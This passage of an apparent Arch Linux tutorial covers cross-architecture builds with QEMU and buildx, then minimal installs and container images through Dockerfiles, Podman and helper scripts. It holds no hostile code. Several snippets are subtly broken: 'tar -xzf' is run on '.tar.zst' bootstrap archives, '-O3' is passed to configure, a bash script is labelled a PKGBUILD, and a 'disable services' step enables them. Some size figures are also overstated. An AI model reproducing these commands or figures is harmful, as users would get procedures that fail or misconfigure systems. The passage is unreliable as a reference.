
**Build multi-architecture images:**
```bash
# Dockerfile
FROM archlinux:base

RUN pacman -Syu --noconfirm
RUN pacman -S base-devel git --noconfirm

WORKDIR /build
```

**Build for different architectures:**
```bash
docker buildx build --platform linux/amd64,linux/arm64 -t myapp .
```

#### Virtual Machine for ARM Development

**Setup VM with QEMU:**
```bash
# Create ARM system image
qemu-system-aarch64 -M virt -m 2048 -cpu cortex-a72 \
    -drive if=virtio,file=arch-arm.img,format=qcow2
```

### Package Compatibility

#### Check Package Availability

**Query across architectures:**
```bash
# On x86_64
pacman -Si package-name

# Check if available for other architectures
# Visit: https://www.archlinux.org/packages/
```

**For ARM packages:**
```bash
# On ARM device
pacman -Si package-name

# Or check Arch Linux ARM packages
# https://archlinuxarm.org/packages
```

#### Handle Missing Packages

**Build from source:**
```bash
# Clone AUR package
git clone https://aur.archlinux.org/package-name.git
cd package-name

# Modify PKGBUILD if needed for ARM
nano PKGBUILD

# Build
makepkg -si
```

**Use alternative packages:**
```bash
# Find similar package
pacman -Ss alternative

# Install
sudo pacman -S alternative-package
```

### Troubleshooting Cross-Architecture Issues

#### Incompatible Binary

**Error:**
```
cannot execute binary file: Exec format error
```

**Cause:** Binary for different architecture

**Solution:**
```bash
# Check binary architecture
file program

# Build for correct architecture
# Or get correct binary for your arch
```

#### Missing Cross-Compilation Tools

**Error:**
```
aarch64-linux-gnu-gcc: command not found
```

**Solution:**
```bash
sudo pacman -S aarch64-linux-gnu-gcc
```

#### Qemu Segmentation Faults

**Error:**
```
Segmentation fault
```

**Solutions:**
- Update qemu
- Use appropriate machine type: `-M virt`
- Increase memory: `-m 2048`
- Enable KVM if available: `-enable-kvm`

#### ARM Build Failures

**Common issues:**
- Floating-point precision differences
- Endianness assumptions
- Memory constraints
- Missing dependencies

**Debug:**
```bash
makepkg -s 2>&1 | tee build.log
# Review log for specific errors
```

### Performance Considerations

#### Build Times by Architecture

**Approximate relative build times:**
- x86_64: 1x (baseline)
- i686: 1.5x (some packages slower)
- aarch64: 2-5x (depends on hardware)
- armv7h: 3-8x (slower ARM hardware)

#### Optimization for Different Architectures

**PKGBUILD optimization:**
```bash
build() {
    case "$CARCH" in
        x86_64)
            ./configure --prefix=/usr -O3
            ;;
        i686)
            ./configure --prefix=/usr -O2
            ;;
        aarch64)
            ./configure --prefix=/usr -O2
            ;;
    esac
}
```

### Best Practices

**Development:**
- Test on actual hardware when possible
- Use qemu for initial testing
- Automate cross-architecture builds
- Maintain separate package repositories

**Compatibility:**
- Support multiple architectures intentionally
- Document architecture-specific requirements
- Test on each supported architecture
- Handle architecture differences in code

**Performance:**
- Optimize for each architecture
- Use appropriate compiler flags
- Consider resource constraints
- Profile on target hardware

**Maintenance:**
- Keep toolchains updated
- Monitor for architecture-specific issues
- Maintain CI/CD for multiple architectures
- Document architecture decisions

Cross-architecture support enables Arch Linux deployment across diverse hardware platforms, from embedded ARM systems to legacy 32-bit machines, maintaining the flexibility and package management excellence across the ecosystem.

## Container and Minimal Installations

### Overview

Minimal Arch Linux installations optimize for small size, fast boot, and resource efficiency. Container deployments use Arch Linux as a base for Docker, Podman, and other container runtimes. Both approaches require careful package selection and configuration.

### Minimal Installation Principles

#### Core Concept

**Minimal installation philosophy:**
- Install only essential packages
- Remove unnecessary dependencies
- Disable unneeded services
- Optimize for specific use case
- Maintain system flexibility

**Size comparison:**
- Full desktop installation: 15-50 GB
- Server installation: 5-15 GB
- Minimal installation: 1-3 GB
- Container image: 500 MB - 2 GB

### Planning Minimal Installation

#### Define System Purpose

**Server:**
- No GUI
- SSH access
- Core services only
- Minimal packages

**Embedded system:**
- Very small footprint
- Limited resources
- Specific functionality
- No unnecessary tools

**Container:**
- Single purpose
- Minimal layering
- Fast startup
- Small image size

#### Identify Required Packages

**Essential packages (always needed):**
```bash
base               # Arch Linux base
linux              # Kernel
systemd            # Init system
pacman             # Package manager
sudo               # Privilege escalation
```

**Conditional packages:**
```bash
# Networking
dhcpcd             # DHCP client
openssh            # SSH server
curl wget          # Download tools

# Administration
vim nano           # Editors
htop               # System monitor
tmux screen        # Terminal multiplexer

# Utilities
bash-completion    # Command completion
man-db             # Manual pages
```

### Building Minimal Systems

#### Minimal Server Installation

**PKGBUILD for minimal server:**
```bash
#!/bin/bash
# Install minimal server

packages_essential=(
    base
    linux
    linux-firmware
    systemd
    pacman
    sudo
    grub
    efibootmgr
)

packages_system=(
    dhcpcd
    openssh
    curl
    wget
    nano
    htop
)

# Install only essential
sudo pacman -S --needed "${packages_essential[@]}"

# Optionally add system packages
# sudo pacman -S --needed "${packages_system[@]}"

# Remove unneeded packages
sudo pacman -Rns man-db git base-devel
```

#### Minimal Chroot Installation

**Create lean system:**
```bash
# Bootstrap
sudo tar -xzf archlinux-bootstrap-*.tar.zst -C /mnt/minimal

# Enter chroot
sudo arch-chroot /mnt/minimal/root.x86_64/

# Inside chroot - minimal installation
pacman -S base linux grub efibootmgr

# Remove unnecessary packages
pacman -Rns man-db base-devel linux-headers git

# Setup only essential services
systemctl enable systemd-networkd
systemctl enable systemd-resolved

# Exit
exit
```

#### Container Base Image

**Create minimal container image:**
```bash
# From minimal chroot setup
sudo tar -czf minimal-arch-base.tar.gz -C /mnt/minimal root.x86_64/

# Verify size
du -sh minimal-arch-base.tar.gz
```

### Docker Container Creation

#### Dockerfile for Minimal Image

**Basic minimal image:**
```dockerfile
# Dockerfile - Minimal Arch Linux

FROM archlinux:base

# Update package database
RUN pacman -Syu --noconfirm

# Install only essential packages
RUN pacman -S --noconfirm \
    bash \
    curl \
    wget \
    ca-certificates

# Clean package cache
RUN pacman -Scc --noconfirm

# Set working directory
WORKDIR /app

# Default command
CMD ["/bin/bash"]
```

**Build image:**
```bash
docker build -t minimal-arch:latest .
```

**Check image size:**
```bash
docker images minimal-arch
```

**Typical sizes:**
- Minimal: 300-500 MB
- With utilities: 500-800 MB
- Full base: 800 MB+

#### Optimized Multi-Stage Build

```dockerfile
# Multi-stage build for smaller images

FROM archlinux:base as builder

RUN pacman -Syu --noconfirm
RUN pacman -S --noconfirm base-devel git

WORKDIR /build
COPY . .

# Build application
RUN make clean && make

# Runtime stage - minimal
FROM archlinux:base

# Copy only built artifacts
COPY --from=builder /build/app /usr/local/bin/

# Install minimal runtime dependencies
RUN pacman -S --noconfirm ca-certificates && \
    pacman -Scc --noconfirm

ENTRYPOINT ["/usr/local/bin/app"]
```

**Build:**
```bash
docker build -t app:minimal -f Dockerfile .
```

#### Application-Specific Container

**Python application:**
```dockerfile
FROM archlinux:base

RUN pacman -Syu --noconfirm
RUN pacman -S --noconfirm python python-pip

WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
RUN pacman -Scc --noconfirm

COPY app.py .
CMD ["python", "app.py"]
```

**Node.js application:**
```dockerfile
FROM archlinux:base

RUN pacman -Syu --noconfirm
RUN pacman -S --noconfirm nodejs npm

WORKDIR /app
COPY package*.json ./
RUN npm ci --production
RUN pacman -Scc --noconfirm

COPY . .
CMD ["node", "app.js"]
```

### Podman Container Creation

#### Containerfile for Podman

**Containerfile (Podman equivalent):**
```dockerfile
# Containerfile - Minimal Arch with Podman

FROM archlinux:base

RUN pacman -Syu --noconfirm
RUN pacman -S --noconfirm curl wget ca-certificates
RUN pacman -Scc --noconfirm

WORKDIR /app
CMD ["/bin/bash"]
```

**Build:**
```bash
podman build -t minimal-arch:latest -f Containerfile .
```

**Run:**
```bash
podman run -it minimal-arch:latest
```

### Size Optimization Techniques

#### Package Cache Cleaning

**In Dockerfile:**
```dockerfile
# After installations
RUN pacman -Scc --noconfirm
```

**Effect:**
- Removes package cache
- Saves ~1-2 GB per image layer

#### Removing Build Dependencies

```dockerfile
FROM archlinux:base

# Build stage
RUN pacman -S --noconfirm gcc make
RUN gcc --version  # Verify build tools

# Remove build tools after use
RUN pacman -Rns --noconfirm gcc make

# Verify removal
RUN which gcc || echo "gcc removed"
```

#### Consolidating RUN Commands

**Inefficient (multiple layers):**
```dockerfile
RUN pacman -Syu --noconfirm
RUN pacman -S --noconfirm package1
RUN pacman -S --noconfirm package2
RUN pacman -Scc --noconfirm
```

**Efficient (single layer):**
```dockerfile
RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm package1 package2 && \
    pacman -Scc --noconfirm
```

#### Using .dockerignore

**.dockerignore file:**
```
.git
.gitignore
*.md
tests/
docs/
```

Prevents unnecessary files in build context.

### Minimal System Configuration

#### Services Configuration

**Disable unnecessary services:**
```bash
# SSH server (if needed)
sudo systemctl enable sshd

# Networking
sudo systemctl enable systemd-networkd
sudo systemctl enable systemd-resolved

# Disable graphical targets
sudo systemctl set-default multi-user.target
```

**Disable unused services:**
```bash
# List services
systemctl list-unit-files

# Disable
sudo systemctl disable bluetooth.service
sudo systemctl disable cups.service
```

#### Kernel Parameters

**Optimize for minimal system:**
```bash
# /etc/sysctl.conf
vm.swappiness=10
net.core.netdev_max_backlog=5000
```

**Reduce kernel modules:**
```bash
# Check loaded modules
lsmod

# Prevent loading unneeded modules
echo "install usb_storage /bin/true" | sudo tee -a /etc/modprobe.d/disable-modules.conf
```

### Container Registry and Distribution

#### Build for Multiple Architectures

**Build multi-arch image:**
```bash
# Using buildx (Docker)
docker buildx build --platform linux/amd64,linux/arm64 \
    -t myrepo/minimal-arch:latest \
    --push .

# Using Podman
podman build --arch amd64 -t minimal-arch:amd64 .
podman build --arch arm64 -t minimal-arch:arm64 .
```

#### Push to Registry

**Docker Hub:**
```bash
# Tag image
docker tag minimal-arch:latest myusername/minimal-arch:latest

# Push
docker push myusername/minimal-arch:latest
```

**Private registry:**
```bash
# Tag for private registry
docker tag minimal-arch:latest registry.example.com/minimal-arch:latest

# Push
docker push registry.example.com/minimal-arch:latest
```

### Minimal Installation Scripts

#### Automated Minimal Setup

```bash
#!/bin/bash
# minimal-install.sh - Automate minimal installation

set -e

# Configuration
HOSTNAME="minimal-host"
TIMEZONE="UTC"
PACKAGES_ESSENTIAL="base linux grub efibootmgr"
PACKAGES_SYSTEM="dhcpcd curl wget"

echo "Creating minimal Arch installation..."

# Mount and bootstrap
mkdir -p /mnt/minimal
mount /dev/sda2 /mnt/minimal
cd /mnt/minimal

# Extract bootstrap
tar -xzf ../archlinux-bootstrap-*.tar.zst

# Enter chroot
arch-chroot root.x86_64/ /bin/bash << CHROOT_END

# Configure system
echo "$HOSTNAME" > /etc/hostname
ln -sf /usr/share/zoneinfo/$TIMEZONE /etc/localtime

# Install packages
pacman -Sy
pacman -S --noconfirm $PACKAGES_ESSENTIAL $PACKAGES_SYSTEM

# Create user
useradd -m user
echo "Set password for user:"
passwd user

# Setup bootloader
grub-install /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg

# Rebuild initramfs
mkinitcpio -P

echo "Installation complete"

CHROOT_END

echo "Unmounting..."
cd /
umount -R /mnt/minimal

echo "Done - ready to reboot"
```

#### Container Build Automation

```bash
#!/bin/bash
# build-minimal-containers.sh

ARCHITECTURES=("amd64" "arm64")
REGISTRY="myregistry.com"
IMAGE_NAME="minimal-arch"

for arch in "${ARCHITECTURES[@]}"; do
    echo "Building for $arch..."
    
    docker buildx build \
        --platform "linux/$arch" \
        -t "$REGISTRY/$IMAGE_NAME:$arch" \
        --push \
        .
    
    echo "Pushed: $REGISTRY/$IMAGE_NAME:$arch"
done

# Create manifest
docker manifest create "$REGISTRY/$IMAGE_NAME:latest" \
    "$REGISTRY/$IMAGE_NAME:amd64" \
    "$REGISTRY/$IMAGE_NAME:arm64"

docker manifest push "$REGISTRY/$IMAGE_NAME:latest"
echo "Manifest created: $REGISTRY/$IMAGE_NAME:latest"
```

### Minimal System Analysis

#### Measure Installation Size

```bash
# Check disk usage
du -sh /
du -sh /usr /var /opt

# List largest packages
expac -H M '%m\t%n' | sort -rh | head -20

# Find largest files
find / -type f -size +100M -exec ls -lh {} \; 2>/dev/null
```

#### Analyze Container Layers

```bash
# Inspect image layers
docker history minimal-arch:latest

# Check image size breakdown
docker inspect minimal-arch:latest | grep -A5 Size

# Analyze layer efficiency
dive minimal-arch:latest  # Requires 'dive' tool
```

### Best Practices

**Installation:**
- Remove build tools after building
- Consolidate package operations
- Clean caches after installations
- Use --needed flag to avoid reinstalls

**Containers:**
- Use multi-stage builds
- Minimize layer count
- Clean caches in each layer
- Remove documentation and debug packages

**Optimization:**
- Profile actual size contributors
- Remove unused packages
- Use base images effectively
- Test minimal configurations

**Maintenance:**
- Document package rationale
- Track dependency changes
- Automate builds and testing
- Version images appropriately

### Typical Minimal Sizes

**Bare system (just kernel/bootloader):**
- 500 MB on disk
- 250 MB compressed

**Server (with SSH, utilities):**
- 2-3 GB on disk
- 500-800 MB compressed
- ~800 MB Docker image

**Container base image:**
- 300-500 MB compressed
- 800 MB - 1.2 GB extracted

**Full application container:**
- 500 MB - 2 GB depending on runtime/dependencies

Minimal installations and container images demonstrate Arch Linux's flexibility and efficiency, enabling deployment on resource-constrained systems while maintaining the full power of the package management system.
